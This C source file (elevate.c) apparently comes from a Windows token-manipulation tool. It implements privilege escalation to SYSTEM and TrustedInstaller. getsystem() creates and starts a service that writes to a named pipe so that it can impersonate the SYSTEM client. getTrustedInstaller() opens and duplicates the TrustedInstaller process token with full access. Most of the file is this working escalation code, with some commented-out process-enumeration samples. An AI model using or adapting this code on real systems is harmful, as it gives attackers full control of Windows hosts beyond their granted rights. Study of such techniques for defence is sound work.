#include "stdafx.h"
#include "elevate.h"

// 1. Drop the service executable
// 2. Create the service
// 3. Create semaphore
// 4. Start thread1 for server named pipe - release the semaphore when listening
// 5. Wait for the semaphore being released, then start service
// 6. Thread1 impersonate the service and update provided token collection
// 7. Wait for thread1 return
// 8. Delete service and executable
// 9. Close handles
// 10. Return

BOOL WINAPI getsystem(TokenCollection * tokens)
{
	ElevationSharedData sharedData = { 0 };
	HANDLE hNamedPipeThread = NULL;

	DWORD dwWaitResult = 0;
	DWORD dwTimeoutForWaitingThread = 10000; // 10 seconds

	DWORD dwResult = 0;
	BOOL bResult = FALSE;

	sharedData.tokens = tokens;

	do
	{
		// 1. Drop the service binary // Not necessary: create service with command line as process
		//dropFileFromB64(, garbagePath);

		// 2. Create the service
		//if (serviceCreate(L"MyElevatingService", garbagePath) != ERROR_SUCCESS)
		//if (serviceCreate(L"MyElevatingService", L"cmd.exe /c echo lol > \\\\.\\pipe\\my_pipe") != ERROR_SUCCESS)
		dwResult = serviceCreate(L"MyElevatingService", L"cmd.exe /c echo lol > \\\\.\\pipe\\my_pipe");
		if (dwResult != ERROR_SUCCESS && dwResult != ERROR_SERVICE_EXISTS)
			break;

		// 3. Create a semaphore
		sharedData.hSemaphore = CreateSemaphoreW(NULL, 2, 2, NULL);
		if (sharedData.hSemaphore == NULL)
		{
			serviceDelete(L"MyElevatingService");
			break;
		}

		// 4. Create the named pipe thread
		hNamedPipeThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)elevatorNamedPipeThread, &sharedData, 0, NULL);

		// 5. Wait for the named pipe thread to release semaphore, then start service
		WaitForSingleObject(sharedData.hSemaphore, dwTimeoutForWaitingThread);

		serviceStart(L"MyElevatingService");

		// 7. Wait for the end of named pipe thread
		WaitForSingleObject(hNamedPipeThread, INFINITE);

		// 8. Delete service
		serviceDelete(L"MyElevatingService");

		bResult = TRUE;
	} while (0);

	// 9. Close handles
	if (sharedData.hSemaphore)
		CloseHandle(sharedData.hSemaphore);

	if (hNamedPipeThread)
		CloseHandle(hNamedPipeThread);

	return bResult;
}

BOOL WINAPI getTrustedInstaller(TokenCollection * tc)
{
	// Process (no CreateToken required):
	// 1. Check "TrustedInstaller.exe" service status
	// 2. If not running, start it
	// 3. Open process "TrustedInstaller.exe"
	// 4. Open process token
	// 5. Duplicate it (problem ? Does SYSTEM owns this process on all WINVER ?)
	// 5.2 Get session ID from process ? Token contains it ? Simple duplication is enough ?
	// 6. Close process handle
	// 7. Save the token in the provided collection
	// 8. Return
	/*
	NTSTATUS CreateToken(
	_In_  PLUID                        LogonId,					// CreateLogonSession()
	_In_  PTOKEN_SOURCE                TokenSource,				// TOKEN_SOURCE struct from Current Tokens
	_In_  SECURITY_LOGON_TYPE          LogonType,				// Service ? Interactive ?
	_In_  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,		// Delegation or Impersonation
	_In_  LSA_TOKEN_INFORMATION_TYPE   TokenInformationType,	// See LSA_TOKEN_INFORMATION_{NULL,V1}
	_In_  PVOID                        TokenInformation,		// Same
	_In_  PTOKEN_GROUPS                TokenGroups,				// Fork current token + integrate SID of TI ? See processhacker
	_In_  PUNICODE_STRING              AccountName,				// "TrustedInstaller"
	_In_  PUNICODE_STRING              AuthorityName,			// "NT SERVICE" ?
	_In_  PUNICODE_STRING              Workstation,				// Current
	_In_  PUNICODE_STRING              ProfilePath,				// NULL
	_Out_ PHANDLE                      Token,					// HANDLE newToken
	_Out_ PNTSTATUS                    SubStatus				// (DWORD *) &error
	);
	*/
	BOOL bResult = FALSE;

	// @TODO - Check TrustedInstaller SID on other Winfow  version
	LPWSTR tiStringSid = L"S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464"; // Well-known SID
	PSID tiSid = NULL;
	LPWSTR sProcName = L"TrustedInstaller.exe";
	DWORD tiProcID = 0;
	DWORD procs[1024] = { 0 };
	DWORD cbNeeded = 0, cProcesses = 0;
	HANDLE hProcess = NULL;

	wchar_t dummy[1024] = { 0 };

	Token tiToken = { 0 };
	unsigned int i = 0;

	do
	{
		// Enumerate all processes and store there IDs in procs[]
		if (!EnumProcesses(procs, (DWORD)sizeof(procs), &cbNeeded))
		{
			WPRINTD_ERROR(L"[elevate.c] getTrustedInstaller. EnumProcesses - FAILED\n", GetLastError());
			break;
		}
		// Calculate how many processes were found
		cProcesses = cbNeeded / sizeof(DWORD);

		// Iterate over cProcesses, try to find "TrustedInstaller.exe"
		/*
		for (i = 0; i < cProcesses; i++)
		{
		if (procs[i] != 0)
		{
		// Check current process' name
		if (checkProcName(procs[i], sProcName))
		{
		// If the process procs[i] is TrustedInstaller.exe, we save the ID and break;
		tiProcID = procs[i];
		break;
		}
		}
		}
		*/
		if (!checkProcessExecution(sProcName, &tiProcID)) // TrustedInstaller.exe was not found
		{
			WPRINTD_ERROR(L"[elevate.c] getTrustedInstaller. searching for TrustedInstaller.exe - FAIL\n", GetLastError());
			break;
		}
		else
		{
			swprintf(dummy, 1024, L"[elevate.c] getTrustedInstaller. fetched PID for TrustedInstaller.exe: %d\n", tiProcID);
			WPRINTD_INFO(dummy);
		}

		// Try to open TrustedInstaller.exe process
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, tiProcID);

		if (NULL == hProcess)
		{
			WPRINTD_ERROR(L"[elevate.c] getTrustedInstaller. OpenProcess - FAIL\n", GetLastError());
			break;
		}

		// Try to open TrustedInstaller.exe token
		if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &tiToken.hPrimaryToken))
		{
			WPRINTD_ERROR(L"[elevate.c] getTrustedInstaller. OpenProcessToken - FAIL\n", GetLastError());
			break;
		}

		// Try to duplicate the token to fulfill the tiToken expectations. Not mandatory to success.
		if (!DuplicateTokenEx(tiToken.hPrimaryToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &tiToken.hPrimaryToken))
			WPRINTD_ERROR(L"[elevate.c] getTrustedInstaller. DuplicateTokenEx - FAIL\n", GetLastError());
		else
			WPRINTD_SUCCESS(L"[elevate.c] getTrustedInstaller. DuplicateTokenEx - SUCCESS\n");

		// Feed the newToken with all relative informations
		feedTokenInformations(&tiToken);

		// Add the newToken to the collection
		addToken(tc, tiToken);

		bResult = TRUE;
		break;

	} while (0);

	if (NULL != tiSid)
		LocalFree(tiSid);

	if (NULL != hProcess)
		CloseHandle(hProcess);

	return bResult;
}
/*** MSDN technic to get process name: does not work for not owned processes ***/
/*
static BOOL WINAPI checkProcName(DWORD procID, LPCWSTR procName)
{
BOOL bResult = FALSE;

HMODULE hMod = NULL;
DWORD cbNeeded = 0;

HANDLE hProcess = NULL;

WCHAR szProcName[MAX_PATH] = L"Unknown";

hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, procID);

if (NULL != hProcess)
{
if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
{
GetModuleBaseNameW(hProcess, hMod, szProcName, sizeof(szProcName) / sizeof(WCHAR));
if (wcscmp(szProcName, procName))
bResult = TRUE;
}
}

CloseHandle(hProcess);
return bResult;
}
*/

static BOOL WINAPI checkProcessExecution(LPCWSTR name, DWORD * pid)
{
	BOOL bResult = FALSE;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot)
	{
		PROCESSENTRY32W pe32 = { 0 };
		pe32.dwSize = sizeof(PROCESSENTRY32W);
		if (Process32FirstW(hSnapshot, &pe32))
		{
			do
			{
				if (wcscmp(pe32.szExeFile, name) == 0)
				{
					*pid = pe32.th32ProcessID;
					bResult = TRUE;
				}
			} while (Process32NextW(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}
	return bResult;
}

/*** This method works under basic admin context, and will list all processes image name */
void PrintProcesses()
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe32)) {
			do {
				printf("pid %d %ws\n", pe32.th32ProcessID, pe32.szExeFile);
			} while (Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}
}

/*
void PrintProcessNameAndID(DWORD processID)
{
TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

// Get a handle to the process.

HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
PROCESS_VM_READ,
FALSE, processID);

// Get the process name.

if (NULL != hProcess)
{
HMODULE hMod;
DWORD cbNeeded;

if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
&cbNeeded))
{
GetModuleBaseName(hProcess, hMod, szProcessName,
sizeof(szProcessName) / sizeof(TCHAR));
}
}
// Print the process name and identifier.

_tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);

// Release the handle to the process.

CloseHandle(hProcess);
}

int test_enum_processes(void)
{
// Get the list of process identifiers.

DWORD aProcesses[1024], cbNeeded, cProcesses;
unsigned int i;

if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
{
return 1;
}


// Calculate how many process identifiers were returned.

cProcesses = cbNeeded / sizeof(DWORD);

// Print the name and process identifier for each process.

for (i = 0; i < cProcesses; i++)
{
if (aProcesses[i] != 0)
{
PrintProcessNameAndID(aProcesses[i]);
}
}

return 0;
}
*/
